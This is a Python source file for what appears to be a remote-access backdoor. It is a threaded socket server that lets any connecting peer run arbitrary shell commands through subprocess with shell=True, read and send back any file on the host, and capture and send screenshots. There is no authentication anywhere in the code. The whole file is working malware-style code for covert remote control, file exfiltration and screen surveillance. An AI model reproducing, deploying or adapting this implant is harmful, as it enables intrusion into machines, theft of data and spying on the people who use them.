import socket
import subprocess
import threading
import platform
import os

from PIL import ImageGrab

from base import PORT, ENCODING, DISCONNECT_MESSAGE
from base import change_dir, send_header_and_data, recv_header_and_data

from output_color import colored_error, colored_info, colored_success
from splitter import command_splitter

SERVER_IP = socket.gethostbyname(socket.gethostname())
ADDR = (SERVER_IP, PORT)

clients = {}

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, socket.SOCK_STREAM)

server_socket.bind(ADDR)


def handle_clients(addr: tuple):
    """Handle each client connected to the server

    Args:
        addr (tuple): address of client
    """
    print(colored_success('💻 New connection: ') +
          f'[{addr[0]}:{addr[1]}] connected 💻 ' +
          colored_info(f'[{threading.active_count() - 1}  Clients]')
          )

    while True:
        command = recv_header_and_data(recv_sock=clients[addr]).decode(encoding=ENCODING)
        splitted_command = command_splitter(command)

        if not command:
            break

        if command == DISCONNECT_MESSAGE:
            break

        if command.lower() == 'os':
            result = platform.platform() + '\n'

        elif command.lower() == 'info':
            result = os.getcwd()

        elif command.lower() == 'clients':
            result = ''
            for num, address in enumerate(clients.keys()):
                result += f'[Client {num+1}]: [{address[0]}:{address[1]}]\n'

        elif splitted_command[0] == 'cd':
            result = change_dir(splitted_command[1])

        elif splitted_command[0] == 'download':
            try:
                with open(splitted_command[1], 'rb') as f:
                    result = f.read()
            except FileNotFoundError:
                result = 'file not found'
            except IsADirectoryError:
                result = 'is a directory'

        elif splitted_command[0] == 'capture':
            try:
                image = ImageGrab.grab()
                image.save(splitted_command[1], 'png')
                with open(splitted_command[1], 'rb') as img:
                    result = img.read()
                os.remove(splitted_command[1])
            except OSError:
                result = 'screenshot-error'

        else:
            output = subprocess.run(command, shell=True, universal_newlines=True,
                                    capture_output=True, check=False)
            if output.stdout is None:
                result = colored_error('❗ Error')
            elif output.stdout == '':
                result = colored_error(output.stderr)
            else:
                result = output.stdout

        if command.lower() != 'info':
            print(colored_info(f'[{addr[0]}:{addr[1]}] ⌨ >') + f' {command}')

        if not result:
            result = colored_error('❗ Error')

        if isinstance(result, str):
            result = result.encode(encoding=ENCODING)

        send_header_and_data(clients[addr], result)

    print(colored_success(f'👋 [{addr[0]}: {addr[1]}] Disconnected'))
    del clients[addr]


def start_server():
    """Start the server and listen for clients connections
    """
    server_socket.listen()
    print('📡 Server start at ' + colored_info(f'[{SERVER_IP}:{PORT}]') + ' 📡')
    while True:
        try:
            client_socket, client_address = server_socket.accept()
        except KeyboardInterrupt:
            break
        else:
            clients[client_address] = client_socket
            thread = threading.Thread(target=handle_clients, args=(client_address,))
            thread.start()

    server_socket.close()
    print(colored_error('👻 Server down.'))


if __name__ == '__main__':
    start_server()
